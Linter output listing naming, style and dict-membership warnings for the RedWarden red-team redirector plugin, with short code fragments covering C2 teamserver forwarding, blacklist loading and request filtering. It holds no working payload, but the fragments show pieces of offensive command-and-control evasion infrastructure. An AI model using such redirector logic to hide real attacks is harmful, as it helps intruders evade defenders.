    |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
426 |                     self.config[k]["verb"] = "POST"
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:436:28
    |
434 |                         }
435 |                     else:
436 |                         if "header" not in self.config[k][a].keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
437 |                             self.config[k][a]["header"] = []
438 |                         if "parameter" not in self.config[k][a].keys():
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:438:28
    |
436 |                         if "header" not in self.config[k][a].keys():
437 |                             self.config[k][a]["header"] = []
438 |                         if "parameter" not in self.config[k][a].keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
439 |                             self.config[k][a]["parameter"] = []
440 |                         if "variant" not in self.config[k][a].keys():
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:440:28
    |
438 |                         if "parameter" not in self.config[k][a].keys():
439 |                             self.config[k][a]["parameter"] = []
440 |                         if "variant" not in self.config[k][a].keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
441 |                             self.config[k][a]["variant"] = "default"
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:444:16
    |
443 |         for k, v in MalleableParser.GlobalOptionsDefaults.items():
444 |             if k.lower() not in self.config.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
445 |                 self.config[k] = v
446 |                 self.logger.dbg(
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:447:21
    |
445 |                   self.config[k] = v
446 |                   self.logger.dbg(
447 | /                     'MalleableParser: Global variable ({}) not defined. Setting default value of: "{}"'.format(
448 | |                         k, v
449 | |                     )
    | |_____________________^
450 |                   )
    |
help: Convert to f-string

F405 `IProxyPlugin` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:453:19
    |
453 | class ProxyPlugin(IProxyPlugin):
    |                   ^^^^^^^^^^^^
454 |     class AlterHostHeader(Exception):
455 |         pass
    |

N818 Exception name `AlterHostHeader` should be named with an Error suffix
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:454:11
    |
453 | class ProxyPlugin(IProxyPlugin):
454 |     class AlterHostHeader(Exception):
    |           ^^^^^^^^^^^^^^^
455 |         pass
    |

N803 Argument name `proxyOptions` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:509:32
    |
507 |     }
508 |
509 |     def __init__(self, logger, proxyOptions):
    |                                ^^^^^^^^^^^^
510 |         self.is_request = False
511 |         self.logger = logger
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:522:16
    |
521 |         for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
522 |             if k not in self.proxyOptions.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
523 |                 self.proxyOptions[k] = v
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:537:16
    |
535 |         self.logger.err(text, color="magenta")
536 |         if not self.proxyOptions["report_only"]:
537 |             if "X-Drop-Reason" in self.addToResHeaders.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
538 |                 self.addToResHeaders["X-Drop-Reason"] += "; " + text
539 |             else:
    |
help: Remove `.keys()`

N806 Variable `parametersRequiringDirectPath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:546:9
    |
544 |         global OVERRIDE_BANNED_AGENTS
545 |
546 |         parametersRequiringDirectPath = (
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
547 |             "ip_addresses_blacklist_file",
548 |             "banned_agents_words_file",
    |

N806 Variable `proxy2BasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:554:9
    |
552 |         )
553 |
554 |         proxy2BasePath = os.path.abspath(
    |         ^^^^^^^^^^^^^^
555 |             os.path.join(os.path.dirname(os.path.realpath(__file__)), "..")
556 |         )
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:558:22
    |
556 |         )
557 |
558 |         if parser != None:
    |                      ^^^^
559 |             parser.add_argument(
560 |                 "--redir-config",
    |
help: Replace with `cond is not None`

N806 Variable `redirectorConfig` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:575:13
    |
573 |                 )
574 |
575 |             redirectorConfig = {}
    |             ^^^^^^^^^^^^^^^^
576 |             configBasePath = ""
577 |             try:
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:576:13
    |
575 |             redirectorConfig = {}
576 |             configBasePath = ""
    |             ^^^^^^^^^^^^^^
577 |             try:
578 |                 if (
    |

N806 Variable `redirectorConfig` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:584:29
    |
582 |                     with open(self.proxyOptions["redir_config"]) as f:
583 |                         try:
584 |                             redirectorConfig = yaml.load(f, Loader=yaml.FullLoader)
    |                             ^^^^^^^^^^^^^^^^
585 |                         except Exception as e:
586 |                             self.logger.fatal(
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:593:28
    |
592 |                     for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
593 |                         if k not in self.proxyOptions.keys():
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
594 |                             self.proxyOptions[k] = v
    |
help: Remove `.keys()`

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:598:25
    |
596 |                     p = os.path.join(proxy2BasePath, self.proxyOptions["redir_config"])
597 |                     if os.path.isfile(p) or os.path.isdir(p):
598 |                         configBasePath = p
    |                         ^^^^^^^^^^^^^^
599 |                     else:
600 |                         configBasePath = os.path.dirname(
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:600:25
    |
598 |                         configBasePath = p
599 |                     else:
600 |                         configBasePath = os.path.dirname(
    |                         ^^^^^^^^^^^^^^
601 |                             os.path.abspath(self.proxyOptions["redir_config"])
602 |                         )
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:606:25
    |
604 |                     p = os.path.join(proxy2BasePath, self.proxyOptions["config"])
605 |                     if os.path.isfile(p) or os.path.isdir(p):
606 |                         configBasePath = p
    |                         ^^^^^^^^^^^^^^
607 |                     else:
608 |                         configBasePath = os.path.dirname(
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:608:25
    |
606 |                         configBasePath = p
607 |                     else:
608 |                         configBasePath = os.path.dirname(
    |                         ^^^^^^^^^^^^^^
609 |                             os.path.abspath(self.proxyOptions["config"])
610 |                         )
    |

N806 Variable `paramName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:619:21
    |
617 |                 )
618 |
619 |                 for paramName in parametersRequiringDirectPath:
    |                     ^^^^^^^^^
620 |                     if (
621 |                         paramName in self.proxyOptions.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:621:25
    |
619 |                 for paramName in parametersRequiringDirectPath:
620 |                     if (
621 |                         paramName in self.proxyOptions.keys()
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
622 |                         and self.proxyOptions[paramName] != ""
623 |                         and self.proxyOptions[paramName] != None
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:623:61
    |
621 |                         paramName in self.proxyOptions.keys()
622 |                         and self.proxyOptions[paramName] != ""
623 |                         and self.proxyOptions[paramName] != None
    |                                                             ^^^^
624 |                     ):
625 |                         p = os.path.join(configBasePath, self.proxyOptions[paramName])
    |
help: Replace with `cond is not None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:632:41
    |
630 |                             self.proxyOptions[paramName] = p
631 |
632 |             except FileNotFoundError as e:
    |                                         ^
633 |                 self.logger.fatal(
634 |                     f'Malleable-redirector config file not found: ({self.proxyOptions["config"]})!'
    |
help: Remove assignment to unused variable `e`

N806 Variable `profileSkipped` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:642:13
    |
640 |                 )
641 |
642 |             profileSkipped = False
    |             ^^^^^^^^^^^^^^
643 |             if ("profile" not in self.proxyOptions.keys()) or (
644 |                 not self.proxyOptions["profile"]
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:643:17
    |
642 |             profileSkipped = False
643 |             if ("profile" not in self.proxyOptions.keys()) or (
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
644 |                 not self.proxyOptions["profile"]
645 |             ):
    |
help: Remove `.keys()`

N806 Variable `profileSkipped` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:655:17
    |
653 |                 )
654 |                 self.malleable = None
655 |                 profileSkipped = True
    |                 ^^^^^^^^^^^^^^
656 |
657 |             else:
    |

N806 Variable `profilePath` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:664:17
    |
662 |                 )
663 |
664 |                 profilePath = self.proxyOptions["profile"]
    |                 ^^^^^^^^^^^
665 |
666 |                 if not self.malleable.parse(profilePath):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:676:18
    |
674 |                     self.logger.fatal("Action/Drop URL must be specified!")
675 |
676 |             elif type(self.proxyOptions["action_url"]) == str:
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
677 |                 url = self.proxyOptions["action_url"]
678 |                 if "," not in url:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:687:18
    |
685 |                     ]
686 |
687 |             elif type(self.proxyOptions["action_url"]) == None and profileSkipped:
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
688 |                 self.proxyOptions["action_url"] = []
    |

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:687:59
    |
685 |                     ]
686 |
687 |             elif type(self.proxyOptions["action_url"]) == None and profileSkipped:
    |                                                           ^^^^
688 |                 self.proxyOptions["action_url"] = []
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:690:51
    |
688 |                 self.proxyOptions["action_url"] = []
689 |
690 |             if self.proxyOptions["proxy_pass"] == None:
    |                                                   ^^^^
691 |                 self.proxyOptions["proxy_pass"] = {}
    |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:693:19
    |
691 |                 self.proxyOptions["proxy_pass"] = {}
692 |
693 |             elif (type(self.proxyOptions["proxy_pass"]) != list) and (
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
694 |                 type(self.proxyOptions["proxy_pass"]) != tuple
695 |             ):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:694:17
    |
693 |             elif (type(self.proxyOptions["proxy_pass"]) != list) and (
694 |                 type(self.proxyOptions["proxy_pass"]) != tuple
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
695 |             ):
696 |                 self.logger.fatal("Proxy Pass must be a list of entries if used!")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:715:29
    |
713 |                       if len(splits) < 2:
714 |                           self.logger.fatal(
715 | /                             "Invalid Proxy Pass entry: ({}): invalid syntax: <url host [options]> required!".format(
716 | |                                 entry
717 | |                             )
    | |_____________________________^
718 |                           )
    |
help: Convert to f-string

SIM108 Use ternary operator `v = opt2[1] if len(opt2) == 2 else "=".join(opt2[1:])` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:765:29
    |
763 |                               k = opt2[0]
764 |                               v = ""
765 | /                             if len(opt2) == 2:
766 | |                                 v = opt2[1]
767 | |                             else:
768 | |                                 v = "=".join(opt2[1:])
    | |______________________________________________________^
769 |
770 |                               passes[num]["options"][k.strip()] = v.strip()
    |
help: Replace `if`-`else`-block with `v = opt2[1] if len(opt2) == 2 else "=".join(opt2[1:])`

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:784:21
    |
782 |                         )
783 |
784 |                     num += 1
    |                     ^^^^^^^^
785 |
786 |                 if len(passes) > 0:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:804:49
    |
802 | ΓÇª                     for k, v in e["options"].items():
803 | ΓÇª                         if len(v) > 0:
804 | ΓÇª                             opts.append("{}: {}".format(k, v))
    |                                           ^^^^^^^^^^^^^^^^^^^^^
805 | ΓÇª                         else:
806 | ΓÇª                             opts.append("{}".format(k))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:806:49
    |
804 |                                     opts.append("{}: {}".format(k, v))
805 |                                 else:
806 |                                     opts.append("{}".format(k))
    |                                                 ^^^^^^^^^^^^^^
807 |
808 |                             line += ", ".join(opts) + ")"
    |
help: Convert to f-string

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:821:16
    |
819 |             #    self.logger.fatal('Teamserver URL must be specified!')
820 |
821 |             if type(self.proxyOptions["teamserver_url"]) == str:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
822 |                 self.proxyOptions["teamserver_url"] = [
823 |                     self.proxyOptions["teamserver_url"],
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:839:29
    |
837 |                         if inport < 1 or inport > 65535:
838 |                             raise Exception()
839 |                         o = "originating from {} ".format(inport)
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
840 |
841 |                     self.logger.dbg(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:858:21
    |
856 |                   raise
857 |                   self.logger.fatal(
858 | /                     "Teamserver's URL does not follow <[https?://]host:port> scheme! {}".format(
859 | |                         str(e)
860 | |                     )
    | |_____________________^
861 |                   )
    |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:895:26
    |
893 |                 )
894 |
895 |             with open(p, "r") as f:
    |                          ^^^
896 |                 for line in f.readlines():
897 |                     if len(line.strip()) == 0:
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:917:26
    |
915 |                 )
916 |
917 |             with open(p, "r") as f:
    |                          ^^^
918 |                 for line in f.readlines():
919 |                     if len(line.strip()) == 0:
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:942:30
    |
940 |                     )
941 |
942 |                 with open(p, "r") as f:
    |                              ^^^
943 |                     for line in f.readlines():
944 |                         l = line.strip()
    |
help: Remove mode argument

E741 Ambiguous variable name: `l`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:944:25
    |
942 |                 with open(p, "r") as f:
943 |                     for line in f.readlines():
944 |                         l = line.strip()
    |                         ^
945 |                         if l.startswith("#") or len(l) < 7:
946 |                             continue
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:956:21
    |
955 |                 self.logger.info(
956 |                     "Loaded {} blacklisted CIDRs.".format(len(self.banned_ips))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
957 |                 )
    |
help: Convert to f-string

F841 Local variable `mydict` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:960:76
    |
959 |             if self.proxyOptions["mitigate_replay_attack"]:
960 |                 with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
    |                                                                            ^^^^^^
961 |                     self.logger.info(
962 |                         "Opening request hashes SQLite from file {} to prevent Replay Attacks.".format(
    |
help: Remove assignment to unused variable `mydict`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:962:25
    |
960 |                   with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
961 |                       self.logger.info(
962 | /                         "Opening request hashes SQLite from file {} to prevent Replay Attacks.".format(
963 | |                             ProxyPlugin.RequestsHashesDatabaseFile
964 | |                         )
    | |_________________________^
965 |                       )
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:968:17
    |
967 |             if (
968 |                 "policy" in self.proxyOptions.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
969 |                 and self.proxyOptions["policy"] != None
970 |                 and len(self.proxyOptions["policy"]) > 0
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:969:52
    |
967 |             if (
968 |                 "policy" in self.proxyOptions.keys()
969 |                 and self.proxyOptions["policy"] != None
    |                                                    ^^^^
970 |                 and len(self.proxyOptions["policy"]) > 0
971 |             ):
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:974:28
    |
972 |                 log = "Enabled policies:\n"
973 |                 for k, v in self.proxyOptions["policy"].items():
974 |                     log += "\t{}: {}\n".format(k, str(v))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
975 |                 self.logger.dbg(log)
976 |             else:
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:982:17
    |
981 |               if (
982 | /                 "add_peers_to_whitelist_if_they_sent_valid_requests"
983 | |                 in self.proxyOptions.keys()
    | |___________________________________________^
984 |                   and self.proxyOptions[
985 |                       "add_peers_to_whitelist_if_they_sent_valid_requests"
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:987:20
    |
985 |                     "add_peers_to_whitelist_if_they_sent_valid_requests"
986 |                 ]
987 |                 != None
    |                    ^^^^
988 |                 and len(
989 |                     self.proxyOptions[
    |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1002:25
     |
1000 |                   ].items():
1001 |                       if (
1002 | /                         k
1003 | |                         not in ProxyPlugin.DefaultRedirectorConfig[
1004 | |                             "add_peers_to_whitelist_if_they_sent_valid_requests"
1005 | |                         ].keys()
     | |________________________________^
1006 |                       ):
1007 |                           self.logger.err(
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1008:29
     |
1006 |                       ):
1007 |                           self.logger.err(
1008 | /                             "Dynamic whitelisting threshold named ({}) not supported! Skipped..".format(
1009 | |                                 k
1010 | |                             )
     | |_____________________________^
1011 |                           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1013:28
     |
1011 |                         )
1012 |
1013 |                     log += "\t{}: {}\n".format(k, str(v))
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1014 |                 self.logger.dbg(log)
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1022:34
     |
1020 |                 ] = {}
1021 |
1022 |     def report(self, ret, ts="", peerIP="", path="", userAgentValue="", reason=""):
     |                                  ^^^^^^^^^
1023 |         prefix = "ALLOW"
1024 |         col = "green"
     |

N803 Argument name `userAgentValue` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1022:54
     |
1020 |                 ] = {}
1021 |
1022 |     def report(self, ret, ts="", peerIP="", path="", userAgentValue="", reason=""):
     |                                                      ^^^^^^^^^^^^^^^^^
1023 |         prefix = "ALLOW"
1024 |         col = "green"
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1026:24
     |
1024 |         col = "green"
1025 |
1026 |         if self.res != None:
     |                        ^^^^
1027 |             return ret
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1042:17
     |
1040 |           if not self.req.suppress_log_entry:
1041 |               self.logger.info(
1042 | /                 '[{}, {}, {}, r:{}] "{}" - UA: "{}"'.format(
1043 | |                     prefix, ts, peerIP, reason, path, userAgentValue
1044 | |                 ),
     | |_________________^
1045 |                   color=col,
1046 |                   forced=True,
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1052:22
     |
1051 |     @staticmethod
1052 |     def get_mock_req(peerIP, command, path, headers):
     |                      ^^^^^^
1053 |         class Request(object):
1054 |             pass
     |

UP004 [*] Class `Request` inherits from `object`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1053:23
     |
1051 |     @staticmethod
1052 |     def get_mock_req(peerIP, command, path, headers):
1053 |         class Request(object):
     |                       ^^^^^^
1054 |             pass
     |
help: Remove `object` inheritance

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1083:9
     |
1081 |         }
1082 |
1083 |         peerIP = req.client_address[0]
     |         ^^^^^^
1084 |
1085 |         for k, v in req.headers.items():
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1086:16
     |
1085 |         for k, v in req.headers.items():
1086 |             if k.lower() in originating_ip_headers.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1087 |                 res = re.findall(originating_ip_headers[k.lower()], v, re.I)
1088 |                 if res and len(res) > 0:
     |
help: Remove `.keys()`

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1089:21
     |
1087 |                 res = re.findall(originating_ip_headers[k.lower()], v, re.I)
1088 |                 if res and len(res) > 0:
1089 |                     peerIP = res[0]
     |                     ^^^^^^
1090 |                     break
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1104:9
     |
1102 |             inport = int(_ts[0])
1103 |             ts = ":".join(_ts[1:])
1104 |         except:
     |         ^^^^^^
1105 |             pass
     |

F841 Local variable `u` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1125:13
     |
1123 |         self.logger.dbg("Peer reached the server at port: " + str(req.server_port))
1124 |         for s in self.proxyOptions["teamserver_url"]:
1125 |             u = urlparse(req.uri)
     |             ^
1126 |             inport, scheme, host, port = self.interpretTeamserverUrl(s)
1127 |             if inport == req.server_port:
     |
help: Remove assignment to unused variable `u`

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1127:13
     |
1125 |               u = urlparse(req.uri)
1126 |               inport, scheme, host, port = self.interpretTeamserverUrl(s)
1127 | /             if inport == req.server_port:
1128 | |                 return s
1129 | |             elif inport == "":
1130 | |                 return s
     | |________________________^
1131 |
1132 |           # return req.uri
     |
help: Combine `if` branches

F841 Local variable `netloc` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1138:17
     |
1136 |         # Passing the request forward.
1137 |         u = urlparse(req.uri)
1138 |         scheme, netloc, path = (
     |                 ^^^^^^
1139 |             u.scheme,
1140 |             u.netloc,
     |
help: Remove assignment to unused variable `netloc`

F841 Local variable `path` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1138:25
     |
1136 |         # Passing the request forward.
1137 |         u = urlparse(req.uri)
1138 |         scheme, netloc, path = (
     |                         ^^^^
1139 |             u.scheme,
1140 |             u.netloc,
     |
help: Remove assignment to unused variable `path`

F841 Local variable `orighost` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1145:9
     |
1143 |         target = _target
1144 |         newhost = ""
1145 |         orighost = req.headers["Host"]
     |         ^^^^^^^^
1146 |
1147 |         if target in self.proxyOptions["teamserver_url"]:
     |
help: Remove assignment to unused variable `orighost`

SIM108 Use ternary operator `target = "https://" + target if req.is_ssl else "http://" + target` instead of `if`-`else`-block
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1167:17
     |
1165 |           else:
1166 |               if not target.startswith("http"):
1167 | /                 if req.is_ssl:
1168 | |                     target = "https://" + target
1169 | |                 else:
1170 | |                     target = "http://" + target
     | |_______________________________________________^
1171 |
1172 |               w = urlparse(target)
     |
help: Replace `if`-`else`-block with `target = "https://" + target if req.is_ssl else "http://" + target`

F841 Local variable `path2` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1173:31
     |
1172 |             w = urlparse(target)
1173 |             scheme2, netloc2, path2 = (
     |                               ^^^^^
1174 |                 w.scheme,
1175 |                 w.netloc,
     |
help: Remove assignment to unused variable `path2`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1193:25
     |
1191 |             self.strip_headers(req, malleable_meta)
1192 |
1193 |         self.logger.dbg('Redirecting to "{}"'.format(req.uri))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1194 |
1195 |         req.redirected_to_c2 = True
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1196:21
     |
1195 |         req.redirected_to_c2 = True
1196 |         req.headers[proxy2_metadata_headers["ignore_response_decompression_errors"]] = (
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1197 |             "1"
1198 |         )
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1199:21
     |
1197 |             "1"
1198 |         )
1199 |         req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1200 |
1201 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1201:12
     |
1199 |         req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
1200 |
